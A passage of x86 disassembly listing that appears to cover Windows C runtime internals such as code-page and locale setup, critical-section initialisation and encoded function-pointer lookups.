  405196:	b9 88 00 00 00       	mov    $0x88,%ecx
  40519b:	8b 76 48             	mov    0x48(%esi),%esi
  40519e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4051a0:	8b f8                	mov    %eax,%edi
  4051a2:	57                   	push   %edi
  4051a3:	ff 75 f4             	push   -0xc(%ebp)
  4051a6:	83 27 00             	andl   $0x0,(%edi)
  4051a9:	e8 5f 01 00 00       	call   0x40530d
  4051ae:	8b f0                	mov    %eax,%esi
  4051b0:	59                   	pop    %ecx
  4051b1:	59                   	pop    %ecx
  4051b2:	3b f3                	cmp    %ebx,%esi
  4051b4:	75 1d                	jne    0x4051d3
  4051b6:	e8 80 f6 ff ff       	call   0x40483b
  4051bb:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4051c1:	8b f3                	mov    %ebx,%esi
  4051c3:	57                   	push   %edi
  4051c4:	e8 44 ec ff ff       	call   0x403e0d
  4051c9:	59                   	pop    %ecx
  4051ca:	5f                   	pop    %edi
  4051cb:	8b c6                	mov    %esi,%eax
  4051cd:	5e                   	pop    %esi
  4051ce:	5b                   	pop    %ebx
  4051cf:	8b e5                	mov    %ebp,%esp
  4051d1:	5d                   	pop    %ebp
  4051d2:	c3                   	ret
  4051d3:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  4051d7:	75 05                	jne    0x4051de
  4051d9:	e8 7c e5 ff ff       	call   0x40375a
  4051de:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4051e1:	8b 40 48             	mov    0x48(%eax),%eax
  4051e4:	f0 0f c1 18          	lock xadd %ebx,(%eax)
  4051e8:	4b                   	dec    %ebx
  4051e9:	75 15                	jne    0x405200
  4051eb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4051ee:	81 78 48 50 33 41 00 	cmpl   $0x413350,0x48(%eax)
  4051f5:	74 09                	je     0x405200
  4051f7:	ff 70 48             	push   0x48(%eax)
  4051fa:	e8 0e ec ff ff       	call   0x403e0d
  4051ff:	59                   	pop    %ecx
  405200:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
  405206:	8b cf                	mov    %edi,%ecx
  405208:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40520b:	33 ff                	xor    %edi,%edi
  40520d:	89 48 48             	mov    %ecx,0x48(%eax)
  405210:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405213:	f6 80 50 03 00 00 02 	testb  $0x2,0x350(%eax)
  40521a:	75 a7                	jne    0x4051c3
  40521c:	f6 05 98 36 41 00 01 	testb  $0x1,0x413698
  405223:	75 9e                	jne    0x4051c3
  405225:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405228:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40522b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40522e:	50                   	push   %eax
  40522f:	6a 05                	push   $0x5
  405231:	e8 80 fb ff ff       	call   0x404db6
  405236:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  40523a:	59                   	pop    %ecx
  40523b:	59                   	pop    %ecx
  40523c:	74 85                	je     0x4051c3
  40523e:	a1 70 35 41 00       	mov    0x413570,%eax
  405243:	a3 34 36 41 00       	mov    %eax,0x413634
  405248:	e9 76 ff ff ff       	jmp    0x4051c3
  40524d:	80 3d 18 3e 41 00 00 	cmpb   $0x0,0x413e18
  405254:	75 12                	jne    0x405268
  405256:	6a 01                	push   $0x1
  405258:	6a fd                	push   $0xfffffffd
  40525a:	e8 ed fe ff ff       	call   0x40514c
  40525f:	59                   	pop    %ecx
  405260:	59                   	pop    %ecx
  405261:	c6 05 18 3e 41 00 01 	movb   $0x1,0x413e18
  405268:	b0 01                	mov    $0x1,%al
  40526a:	c3                   	ret
  40526b:	6a 0c                	push   $0xc
  40526d:	68 48 18 41 00       	push   $0x411848
  405272:	e8 99 ce ff ff       	call   0x402110
  405277:	33 f6                	xor    %esi,%esi
  405279:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40527c:	e8 a9 f0 ff ff       	call   0x40432a
  405281:	8b f8                	mov    %eax,%edi
  405283:	8b 0d 98 36 41 00    	mov    0x413698,%ecx
  405289:	85 8f 50 03 00 00    	test   %ecx,0x350(%edi)
  40528f:	74 11                	je     0x4052a2
  405291:	39 77 4c             	cmp    %esi,0x4c(%edi)
  405294:	74 0c                	je     0x4052a2
  405296:	8b 77 48             	mov    0x48(%edi),%esi
  405299:	85 f6                	test   %esi,%esi
  40529b:	75 68                	jne    0x405305
  40529d:	e8 f3 eb ff ff       	call   0x403e95
  4052a2:	6a 05                	push   $0x5
  4052a4:	e8 b7 03 00 00       	call   0x405660
  4052a9:	59                   	pop    %ecx
  4052aa:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4052ad:	8b 77 48             	mov    0x48(%edi),%esi
  4052b0:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4052b3:	3b 35 70 35 41 00    	cmp    0x413570,%esi
  4052b9:	74 30                	je     0x4052eb
  4052bb:	85 f6                	test   %esi,%esi
  4052bd:	74 18                	je     0x4052d7
  4052bf:	83 c8 ff             	or     $0xffffffff,%eax
  4052c2:	f0 0f c1 06          	lock xadd %eax,(%esi)
  4052c6:	75 0f                	jne    0x4052d7
  4052c8:	81 fe 50 33 41 00    	cmp    $0x413350,%esi
  4052ce:	74 07                	je     0x4052d7
  4052d0:	56                   	push   %esi
  4052d1:	e8 37 eb ff ff       	call   0x403e0d
  4052d6:	59                   	pop    %ecx
  4052d7:	a1 70 35 41 00       	mov    0x413570,%eax
  4052dc:	89 47 48             	mov    %eax,0x48(%edi)
  4052df:	8b 35 70 35 41 00    	mov    0x413570,%esi
  4052e5:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4052e8:	f0 ff 06             	lock incl (%esi)
  4052eb:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4052f2:	e8 05 00 00 00       	call   0x4052fc
  4052f7:	eb a0                	jmp    0x405299
  4052f9:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4052fc:	6a 05                	push   $0x5
  4052fe:	e8 a5 03 00 00       	call   0x4056a8
  405303:	59                   	pop    %ecx
  405304:	c3                   	ret
  405305:	8b c6                	mov    %esi,%eax
  405307:	e8 4a ce ff ff       	call   0x402156
  40530c:	c3                   	ret
  40530d:	8b ff                	mov    %edi,%edi
  40530f:	55                   	push   %ebp
  405310:	8b ec                	mov    %esp,%ebp
  405312:	83 ec 20             	sub    $0x20,%esp
  405315:	a1 04 30 41 00       	mov    0x413004,%eax
  40531a:	33 c5                	xor    %ebp,%eax
  40531c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40531f:	53                   	push   %ebx
  405320:	56                   	push   %esi
  405321:	ff 75 08             	push   0x8(%ebp)
  405324:	8b 75 0c             	mov    0xc(%ebp),%esi
  405327:	e8 b4 fb ff ff       	call   0x404ee0
  40532c:	8b d8                	mov    %eax,%ebx
  40532e:	59                   	pop    %ecx
  40532f:	85 db                	test   %ebx,%ebx
  405331:	75 0e                	jne    0x405341
  405333:	56                   	push   %esi
  405334:	e8 1a fc ff ff       	call   0x404f53
  405339:	59                   	pop    %ecx
  40533a:	33 c0                	xor    %eax,%eax
  40533c:	e9 ad 01 00 00       	jmp    0x4054ee
  405341:	57                   	push   %edi
  405342:	33 ff                	xor    %edi,%edi
  405344:	8b cf                	mov    %edi,%ecx
  405346:	8b c7                	mov    %edi,%eax
  405348:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40534b:	39 98 58 30 41 00    	cmp    %ebx,0x413058(%eax)
  405351:	0f 84 ea 00 00 00    	je     0x405441
  405357:	41                   	inc    %ecx
  405358:	83 c0 30             	add    $0x30,%eax
  40535b:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40535e:	3d f0 00 00 00       	cmp    $0xf0,%eax
  405363:	72 e6                	jb     0x40534b
  405365:	81 fb e8 fd 00 00    	cmp    $0xfde8,%ebx
  40536b:	0f 84 c8 00 00 00    	je     0x405439
  405371:	81 fb e9 fd 00 00    	cmp    $0xfde9,%ebx
  405377:	0f 84 bc 00 00 00    	je     0x405439
  40537d:	0f b7 c3             	movzwl %bx,%eax
  405380:	50                   	push   %eax
  405381:	ff 15 04 c1 40 00    	call   *0x40c104
  405387:	85 c0                	test   %eax,%eax
  405389:	0f 84 aa 00 00 00    	je     0x405439
  40538f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405392:	50                   	push   %eax
  405393:	53                   	push   %ebx
  405394:	ff 15 0c c1 40 00    	call   *0x40c10c
  40539a:	85 c0                	test   %eax,%eax
  40539c:	0f 84 84 00 00 00    	je     0x405426
  4053a2:	68 01 01 00 00       	push   $0x101
  4053a7:	8d 46 18             	lea    0x18(%esi),%eax
  4053aa:	57                   	push   %edi
  4053ab:	50                   	push   %eax
  4053ac:	e8 5f d1 ff ff       	call   0x402510
  4053b1:	89 5e 04             	mov    %ebx,0x4(%esi)
  4053b4:	83 c4 0c             	add    $0xc,%esp
  4053b7:	33 db                	xor    %ebx,%ebx
  4053b9:	89 be 1c 02 00 00    	mov    %edi,0x21c(%esi)
  4053bf:	43                   	inc    %ebx
  4053c0:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4053c3:	76 51                	jbe    0x405416
  4053c5:	80 7d ee 00          	cmpb   $0x0,-0x12(%ebp)
  4053c9:	8d 45 ee             	lea    -0x12(%ebp),%eax
  4053cc:	74 21                	je     0x4053ef
  4053ce:	8a 48 01             	mov    0x1(%eax),%cl
  4053d1:	84 c9                	test   %cl,%cl
  4053d3:	74 1a                	je     0x4053ef
  4053d5:	0f b6 d1             	movzbl %cl,%edx
  4053d8:	0f b6 08             	movzbl (%eax),%ecx
  4053db:	eb 06                	jmp    0x4053e3
  4053dd:	80 4c 0e 19 04       	orb    $0x4,0x19(%esi,%ecx,1)
  4053e2:	41                   	inc    %ecx
  4053e3:	3b ca                	cmp    %edx,%ecx
  4053e5:	76 f6                	jbe    0x4053dd
  4053e7:	83 c0 02             	add    $0x2,%eax
  4053ea:	80 38 00             	cmpb   $0x0,(%eax)
  4053ed:	75 df                	jne    0x4053ce
  4053ef:	8d 46 1a             	lea    0x1a(%esi),%eax
  4053f2:	b9 fe 00 00 00       	mov    $0xfe,%ecx
  4053f7:	80 08 08             	orb    $0x8,(%eax)
  4053fa:	40                   	inc    %eax
  4053fb:	83 e9 01             	sub    $0x1,%ecx
  4053fe:	75 f7                	jne    0x4053f7
  405400:	ff 76 04             	push   0x4(%esi)
  405403:	e8 9a fa ff ff       	call   0x404ea2
  405408:	83 c4 04             	add    $0x4,%esp
  40540b:	89 86 1c 02 00 00    	mov    %eax,0x21c(%esi)
  405411:	89 5e 08             	mov    %ebx,0x8(%esi)
  405414:	eb 03                	jmp    0x405419
  405416:	89 7e 08             	mov    %edi,0x8(%esi)
  405419:	33 c0                	xor    %eax,%eax
  40541b:	8d 7e 0c             	lea    0xc(%esi),%edi
  40541e:	ab                   	stos   %eax,%es:(%edi)
  40541f:	ab                   	stos   %eax,%es:(%edi)
  405420:	ab                   	stos   %eax,%es:(%edi)
  405421:	e9 be 00 00 00       	jmp    0x4054e4
  405426:	39 3d 14 3e 41 00    	cmp    %edi,0x413e14
  40542c:	74 0b                	je     0x405439
  40542e:	56                   	push   %esi
  40542f:	e8 1f fb ff ff       	call   0x404f53
  405434:	e9 b1 00 00 00       	jmp    0x4054ea
  405439:	83 c8 ff             	or     $0xffffffff,%eax
  40543c:	e9 ac 00 00 00       	jmp    0x4054ed
  405441:	68 01 01 00 00       	push   $0x101
  405446:	8d 46 18             	lea    0x18(%esi),%eax
  405449:	57                   	push   %edi
  40544a:	50                   	push   %eax
  40544b:	e8 c0 d0 ff ff       	call   0x402510
  405450:	83 c4 0c             	add    $0xc,%esp
  405453:	6b 45 e4 30          	imul   $0x30,-0x1c(%ebp),%eax
  405457:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40545a:	8d 80 68 30 41 00    	lea    0x413068(%eax),%eax
  405460:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405463:	80 38 00             	cmpb   $0x0,(%eax)
  405466:	8b c8                	mov    %eax,%ecx
  405468:	74 35                	je     0x40549f
  40546a:	8a 41 01             	mov    0x1(%ecx),%al
  40546d:	84 c0                	test   %al,%al
  40546f:	74 2b                	je     0x40549c
  405471:	0f b6 11             	movzbl (%ecx),%edx
  405474:	0f b6 c0             	movzbl %al,%eax
  405477:	eb 17                	jmp    0x405490
  405479:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  40547f:	73 13                	jae    0x405494
  405481:	8a 87 50 30 41 00    	mov    0x413050(%edi),%al
  405487:	08 44 16 19          	or     %al,0x19(%esi,%edx,1)
  40548b:	42                   	inc    %edx
  40548c:	0f b6 41 01          	movzbl 0x1(%ecx),%eax
  405490:	3b d0                	cmp    %eax,%edx
  405492:	76 e5                	jbe    0x405479
  405494:	83 c1 02             	add    $0x2,%ecx
  405497:	80 39 00             	cmpb   $0x0,(%ecx)
  40549a:	75 ce                	jne    0x40546a
  40549c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40549f:	47                   	inc    %edi
  4054a0:	83 c0 08             	add    $0x8,%eax
  4054a3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4054a6:	83 ff 04             	cmp    $0x4,%edi
  4054a9:	72 b8                	jb     0x405463
  4054ab:	53                   	push   %ebx
  4054ac:	89 5e 04             	mov    %ebx,0x4(%esi)
  4054af:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  4054b6:	e8 e7 f9 ff ff       	call   0x404ea2
  4054bb:	83 c4 04             	add    $0x4,%esp
  4054be:	89 86 1c 02 00 00    	mov    %eax,0x21c(%esi)
  4054c4:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4054c7:	8d 4e 0c             	lea    0xc(%esi),%ecx
  4054ca:	6a 06                	push   $0x6
  4054cc:	8d 90 5c 30 41 00    	lea    0x41305c(%eax),%edx
  4054d2:	5f                   	pop    %edi
  4054d3:	66 8b 02             	mov    (%edx),%ax
  4054d6:	8d 52 02             	lea    0x2(%edx),%edx
  4054d9:	66 89 01             	mov    %ax,(%ecx)
  4054dc:	8d 49 02             	lea    0x2(%ecx),%ecx
  4054df:	83 ef 01             	sub    $0x1,%edi
  4054e2:	75 ef                	jne    0x4054d3
  4054e4:	56                   	push   %esi
  4054e5:	e8 ce fa ff ff       	call   0x404fb8
  4054ea:	59                   	pop    %ecx
  4054eb:	33 c0                	xor    %eax,%eax
  4054ed:	5f                   	pop    %edi
  4054ee:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4054f1:	5e                   	pop    %esi
  4054f2:	33 cd                	xor    %ebp,%ecx
  4054f4:	5b                   	pop    %ebx
  4054f5:	e8 ce c2 ff ff       	call   0x4017c8
  4054fa:	8b e5                	mov    %ebp,%esp
  4054fc:	5d                   	pop    %ebp
  4054fd:	c3                   	ret
  4054fe:	8b ff                	mov    %edi,%edi
  405500:	55                   	push   %ebp
  405501:	8b ec                	mov    %esp,%ebp
  405503:	56                   	push   %esi
  405504:	8b 75 14             	mov    0x14(%ebp),%esi
  405507:	85 f6                	test   %esi,%esi
  405509:	75 04                	jne    0x40550f
  40550b:	33 c0                	xor    %eax,%eax
  40550d:	eb 6d                	jmp    0x40557c
  40550f:	8b 45 08             	mov    0x8(%ebp),%eax
  405512:	85 c0                	test   %eax,%eax
  405514:	75 13                	jne    0x405529
  405516:	e8 20 f3 ff ff       	call   0x40483b
  40551b:	6a 16                	push   $0x16
  40551d:	5e                   	pop    %esi
  40551e:	89 30                	mov    %esi,(%eax)
  405520:	e8 1e f1 ff ff       	call   0x404643
  405525:	8b c6                	mov    %esi,%eax
  405527:	eb 53                	jmp    0x40557c
  405529:	57                   	push   %edi
  40552a:	8b 7d 10             	mov    0x10(%ebp),%edi
  40552d:	85 ff                	test   %edi,%edi
  40552f:	74 14                	je     0x405545
  405531:	39 75 0c             	cmp    %esi,0xc(%ebp)
  405534:	72 0f                	jb     0x405545
  405536:	56                   	push   %esi
  405537:	57                   	push   %edi
  405538:	50                   	push   %eax
  405539:	e8 52 58 00 00       	call   0x40ad90
  40553e:	83 c4 0c             	add    $0xc,%esp
  405541:	33 c0                	xor    %eax,%eax
  405543:	eb 36                	jmp    0x40557b
  405545:	ff 75 0c             	push   0xc(%ebp)
  405548:	6a 00                	push   $0x0
  40554a:	50                   	push   %eax
  40554b:	e8 c0 cf ff ff       	call   0x402510
  405550:	83 c4 0c             	add    $0xc,%esp
  405553:	85 ff                	test   %edi,%edi
  405555:	75 09                	jne    0x405560
  405557:	e8 df f2 ff ff       	call   0x40483b
  40555c:	6a 16                	push   $0x16
  40555e:	eb 0c                	jmp    0x40556c
  405560:	39 75 0c             	cmp    %esi,0xc(%ebp)
  405563:	73 13                	jae    0x405578
  405565:	e8 d1 f2 ff ff       	call   0x40483b
  40556a:	6a 22                	push   $0x22
  40556c:	5e                   	pop    %esi
  40556d:	89 30                	mov    %esi,(%eax)
  40556f:	e8 cf f0 ff ff       	call   0x404643
  405574:	8b c6                	mov    %esi,%eax
  405576:	eb 03                	jmp    0x40557b
  405578:	6a 16                	push   $0x16
  40557a:	58                   	pop    %eax
  40557b:	5f                   	pop    %edi
  40557c:	5e                   	pop    %esi
  40557d:	5d                   	pop    %ebp
  40557e:	c3                   	ret
  40557f:	ff 15 10 c1 40 00    	call   *0x40c110
  405585:	a3 28 3e 41 00       	mov    %eax,0x413e28
  40558a:	ff 15 14 c1 40 00    	call   *0x40c114
  405590:	a3 2c 3e 41 00       	mov    %eax,0x413e2c
  405595:	b0 01                	mov    $0x1,%al
  405597:	c3                   	ret
  405598:	8b ff                	mov    %edi,%edi
  40559a:	55                   	push   %ebp
  40559b:	8b ec                	mov    %esp,%ebp
  40559d:	8b 55 08             	mov    0x8(%ebp),%edx
  4055a0:	57                   	push   %edi
  4055a1:	33 ff                	xor    %edi,%edi
  4055a3:	66 39 3a             	cmp    %di,(%edx)
  4055a6:	74 21                	je     0x4055c9
  4055a8:	56                   	push   %esi
  4055a9:	8b ca                	mov    %edx,%ecx
  4055ab:	8d 71 02             	lea    0x2(%ecx),%esi
  4055ae:	66 8b 01             	mov    (%ecx),%ax
  4055b1:	83 c1 02             	add    $0x2,%ecx
  4055b4:	66 3b c7             	cmp    %di,%ax
  4055b7:	75 f5                	jne    0x4055ae
  4055b9:	2b ce                	sub    %esi,%ecx
  4055bb:	d1 f9                	sar    $1,%ecx
  4055bd:	8d 14 4a             	lea    (%edx,%ecx,2),%edx
  4055c0:	83 c2 02             	add    $0x2,%edx
  4055c3:	66 39 3a             	cmp    %di,(%edx)
  4055c6:	75 e1                	jne    0x4055a9
  4055c8:	5e                   	pop    %esi
  4055c9:	8d 42 02             	lea    0x2(%edx),%eax
  4055cc:	5f                   	pop    %edi
  4055cd:	5d                   	pop    %ebp
  4055ce:	c3                   	ret
  4055cf:	8b ff                	mov    %edi,%edi
  4055d1:	56                   	push   %esi
  4055d2:	57                   	push   %edi
  4055d3:	ff 15 18 c1 40 00    	call   *0x40c118
  4055d9:	8b f0                	mov    %eax,%esi
  4055db:	85 f6                	test   %esi,%esi
  4055dd:	75 04                	jne    0x4055e3
  4055df:	33 ff                	xor    %edi,%edi
  4055e1:	eb 37                	jmp    0x40561a
  4055e3:	53                   	push   %ebx
  4055e4:	56                   	push   %esi
  4055e5:	e8 ae ff ff ff       	call   0x405598
  4055ea:	2b c6                	sub    %esi,%eax
  4055ec:	d1 f8                	sar    $1,%eax
  4055ee:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
  4055f1:	53                   	push   %ebx
  4055f2:	e8 50 e8 ff ff       	call   0x403e47
  4055f7:	8b f8                	mov    %eax,%edi
  4055f9:	59                   	pop    %ecx
  4055fa:	59                   	pop    %ecx
  4055fb:	85 ff                	test   %edi,%edi
  4055fd:	74 0b                	je     0x40560a
  4055ff:	53                   	push   %ebx
  405600:	56                   	push   %esi
  405601:	57                   	push   %edi
  405602:	e8 89 57 00 00       	call   0x40ad90
  405607:	83 c4 0c             	add    $0xc,%esp
  40560a:	6a 00                	push   $0x0
  40560c:	e8 fc e7 ff ff       	call   0x403e0d
  405611:	59                   	pop    %ecx
  405612:	56                   	push   %esi
  405613:	ff 15 1c c1 40 00    	call   *0x40c11c
  405619:	5b                   	pop    %ebx
  40561a:	8b c7                	mov    %edi,%eax
  40561c:	5f                   	pop    %edi
  40561d:	5e                   	pop    %esi
  40561e:	c3                   	ret
  40561f:	8b ff                	mov    %edi,%edi
  405621:	56                   	push   %esi
  405622:	57                   	push   %edi
  405623:	bf 38 3e 41 00       	mov    $0x413e38,%edi
  405628:	33 f6                	xor    %esi,%esi
  40562a:	6a 00                	push   $0x0
  40562c:	68 a0 0f 00 00       	push   $0xfa0
  405631:	57                   	push   %edi
  405632:	e8 fa 02 00 00       	call   0x405931
  405637:	85 c0                	test   %eax,%eax
  405639:	74 18                	je     0x405653
  40563b:	ff 05 70 3f 41 00    	incl   0x413f70
  405641:	83 c6 18             	add    $0x18,%esi
  405644:	83 c7 18             	add    $0x18,%edi
  405647:	81 fe 38 01 00 00    	cmp    $0x138,%esi
  40564d:	72 db                	jb     0x40562a
  40564f:	b0 01                	mov    $0x1,%al
  405651:	eb 0a                	jmp    0x40565d
  405653:	6a 00                	push   $0x0
  405655:	e8 1d 00 00 00       	call   0x405677
  40565a:	59                   	pop    %ecx
  40565b:	32 c0                	xor    %al,%al
  40565d:	5f                   	pop    %edi
  40565e:	5e                   	pop    %esi
  40565f:	c3                   	ret
  405660:	8b ff                	mov    %edi,%edi
  405662:	55                   	push   %ebp
  405663:	8b ec                	mov    %esp,%ebp
  405665:	6b 45 08 18          	imul   $0x18,0x8(%ebp),%eax
  405669:	05 38 3e 41 00       	add    $0x413e38,%eax
  40566e:	50                   	push   %eax
  40566f:	ff 15 b0 c0 40 00    	call   *0x40c0b0
  405675:	5d                   	pop    %ebp
  405676:	c3                   	ret
  405677:	8b ff                	mov    %edi,%edi
  405679:	56                   	push   %esi
  40567a:	8b 35 70 3f 41 00    	mov    0x413f70,%esi
  405680:	85 f6                	test   %esi,%esi
  405682:	74 20                	je     0x4056a4
  405684:	6b c6 18             	imul   $0x18,%esi,%eax
  405687:	57                   	push   %edi
  405688:	8d b8 20 3e 41 00    	lea    0x413e20(%eax),%edi
  40568e:	57                   	push   %edi
  40568f:	ff 15 b8 c0 40 00    	call   *0x40c0b8
  405695:	ff 0d 70 3f 41 00    	decl   0x413f70
  40569b:	83 ef 18             	sub    $0x18,%edi
  40569e:	83 ee 01             	sub    $0x1,%esi
  4056a1:	75 eb                	jne    0x40568e
  4056a3:	5f                   	pop    %edi
  4056a4:	b0 01                	mov    $0x1,%al
  4056a6:	5e                   	pop    %esi
  4056a7:	c3                   	ret
  4056a8:	8b ff                	mov    %edi,%edi
  4056aa:	55                   	push   %ebp
  4056ab:	8b ec                	mov    %esp,%ebp
  4056ad:	6b 45 08 18          	imul   $0x18,0x8(%ebp),%eax
  4056b1:	05 38 3e 41 00       	add    $0x413e38,%eax
  4056b6:	50                   	push   %eax
  4056b7:	ff 15 b4 c0 40 00    	call   *0x40c0b4
  4056bd:	5d                   	pop    %ebp
  4056be:	c3                   	ret
  4056bf:	8b ff                	mov    %edi,%edi
  4056c1:	55                   	push   %ebp
  4056c2:	8b ec                	mov    %esp,%ebp
  4056c4:	8b 45 08             	mov    0x8(%ebp),%eax
  4056c7:	53                   	push   %ebx
  4056c8:	56                   	push   %esi
  4056c9:	57                   	push   %edi
  4056ca:	8d 1c 85 c8 3f 41 00 	lea    0x413fc8(,%eax,4),%ebx
  4056d1:	8b 03                	mov    (%ebx),%eax
  4056d3:	8b 15 04 30 41 00    	mov    0x413004,%edx
  4056d9:	83 cf ff             	or     $0xffffffff,%edi
  4056dc:	8b ca                	mov    %edx,%ecx
  4056de:	8b f2                	mov    %edx,%esi
  4056e0:	83 e1 1f             	and    $0x1f,%ecx
  4056e3:	33 f0                	xor    %eax,%esi
  4056e5:	d3 ce                	ror    %cl,%esi
  4056e7:	3b f7                	cmp    %edi,%esi
  4056e9:	74 69                	je     0x405754
  4056eb:	85 f6                	test   %esi,%esi
  4056ed:	74 04                	je     0x4056f3
  4056ef:	8b c6                	mov    %esi,%eax
  4056f1:	eb 63                	jmp    0x405756
  4056f3:	8b 75 10             	mov    0x10(%ebp),%esi
  4056f6:	3b 75 14             	cmp    0x14(%ebp),%esi
  4056f9:	74 1a                	je     0x405715
  4056fb:	ff 36                	push   (%esi)
  4056fd:	e8 59 00 00 00       	call   0x40575b
  405702:	59                   	pop    %ecx
  405703:	85 c0                	test   %eax,%eax
  405705:	75 2f                	jne    0x405736
  405707:	83 c6 04             	add    $0x4,%esi
  40570a:	3b 75 14             	cmp    0x14(%ebp),%esi
  40570d:	75 ec                	jne    0x4056fb
  40570f:	8b 15 04 30 41 00    	mov    0x413004,%edx
  405715:	33 c0                	xor    %eax,%eax
  405717:	85 c0                	test   %eax,%eax
  405719:	74 29                	je     0x405744
  40571b:	ff 75 0c             	push   0xc(%ebp)
  40571e:	50                   	push   %eax
  40571f:	ff 15 d4 c0 40 00    	call   *0x40c0d4
  405725:	8b f0                	mov    %eax,%esi
  405727:	85 f6                	test   %esi,%esi
  405729:	74 13                	je     0x40573e
  40572b:	56                   	push   %esi
  40572c:	e8 fb c3 ff ff       	call   0x401b2c
  405731:	59                   	pop    %ecx
  405732:	87 03                	xchg   %eax,(%ebx)
  405734:	eb b9                	jmp    0x4056ef
  405736:	8b 15 04 30 41 00    	mov    0x413004,%edx
  40573c:	eb d9                	jmp    0x405717
  40573e:	8b 15 04 30 41 00    	mov    0x413004,%edx
  405744:	8b c2                	mov    %edx,%eax
  405746:	6a 20                	push   $0x20
  405748:	83 e0 1f             	and    $0x1f,%eax
  40574b:	59                   	pop    %ecx
  40574c:	2b c8                	sub    %eax,%ecx
  40574e:	d3 cf                	ror    %cl,%edi
  405750:	33 fa                	xor    %edx,%edi
  405752:	87 3b                	xchg   %edi,(%ebx)
  405754:	33 c0                	xor    %eax,%eax
  405756:	5f                   	pop    %edi
  405757:	5e                   	pop    %esi
  405758:	5b                   	pop    %ebx
  405759:	5d                   	pop    %ebp
  40575a:	c3                   	ret
  40575b:	8b ff                	mov    %edi,%edi
  40575d:	55                   	push   %ebp
  40575e:	8b ec                	mov    %esp,%ebp
  405760:	8b 45 08             	mov    0x8(%ebp),%eax
  405763:	57                   	push   %edi
  405764:	8d 3c 85 78 3f 41 00 	lea    0x413f78(,%eax,4),%edi
  40576b:	8b 0f                	mov    (%edi),%ecx
  40576d:	85 c9                	test   %ecx,%ecx
  40576f:	74 0b                	je     0x40577c
  405771:	8d 41 01             	lea    0x1(%ecx),%eax
  405774:	f7 d8                	neg    %eax
  405776:	1b c0                	sbb    %eax,%eax
  405778:	23 c1                	and    %ecx,%eax
  40577a:	eb 57                	jmp    0x4057d3
  40577c:	53                   	push   %ebx
  40577d:	8b 1c 85 18 cd 40 00 	mov    0x40cd18(,%eax,4),%ebx
  405784:	56                   	push   %esi
  405785:	68 00 08 00 00       	push   $0x800
  40578a:	6a 00                	push   $0x0
  40578c:	53                   	push   %ebx
  40578d:	ff 15 d8 c0 40 00    	call   *0x40c0d8
  405793:	8b f0                	mov    %eax,%esi
  405795:	85 f6                	test   %esi,%esi
  405797:	75 27                	jne    0x4057c0
  405799:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  40579f:	83 f8 57             	cmp    $0x57,%eax
  4057a2:	75 0d                	jne    0x4057b1
  4057a4:	56                   	push   %esi
  4057a5:	56                   	push   %esi
  4057a6:	53                   	push   %ebx
  4057a7:	ff 15 d8 c0 40 00    	call   *0x40c0d8
  4057ad:	8b f0                	mov    %eax,%esi
  4057af:	eb 02                	jmp    0x4057b3
  4057b1:	33 f6                	xor    %esi,%esi
  4057b3:	85 f6                	test   %esi,%esi
  4057b5:	75 09                	jne    0x4057c0
  4057b7:	83 c8 ff             	or     $0xffffffff,%eax
  4057ba:	87 07                	xchg   %eax,(%edi)
  4057bc:	33 c0                	xor    %eax,%eax
  4057be:	eb 11                	jmp    0x4057d1
  4057c0:	8b c6                	mov    %esi,%eax
  4057c2:	87 07                	xchg   %eax,(%edi)
  4057c4:	85 c0                	test   %eax,%eax
  4057c6:	74 07                	je     0x4057cf
  4057c8:	56                   	push   %esi
  4057c9:	ff 15 d0 c0 40 00    	call   *0x40c0d0
  4057cf:	8b c6                	mov    %esi,%eax
  4057d1:	5e                   	pop    %esi
  4057d2:	5b                   	pop    %ebx
  4057d3:	5f                   	pop    %edi
  4057d4:	5d                   	pop    %ebp
  4057d5:	c3                   	ret
  4057d6:	8b ff                	mov    %edi,%edi
  4057d8:	55                   	push   %ebp
  4057d9:	8b ec                	mov    %esp,%ebp
  4057db:	51                   	push   %ecx
  4057dc:	a1 04 30 41 00       	mov    0x413004,%eax
  4057e1:	33 c5                	xor    %ebp,%eax
  4057e3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4057e6:	56                   	push   %esi
  4057e7:	68 c0 d1 40 00       	push   $0x40d1c0
  4057ec:	68 b8 d1 40 00       	push   $0x40d1b8
  4057f1:	68 70 c2 40 00       	push   $0x40c270
  4057f6:	6a 03                	push   $0x3
  4057f8:	e8 c2 fe ff ff       	call   0x4056bf
  4057fd:	8b f0                	mov    %eax,%esi
  4057ff:	83 c4 10             	add    $0x10,%esp
  405802:	85 f6                	test   %esi,%esi
  405804:	74 0f                	je     0x405815
  405806:	ff 75 08             	push   0x8(%ebp)
  405809:	8b ce                	mov    %esi,%ecx
  40580b:	ff 15 60 c1 40 00    	call   *0x40c160
  405811:	ff d6                	call   *%esi
  405813:	eb 06                	jmp    0x40581b
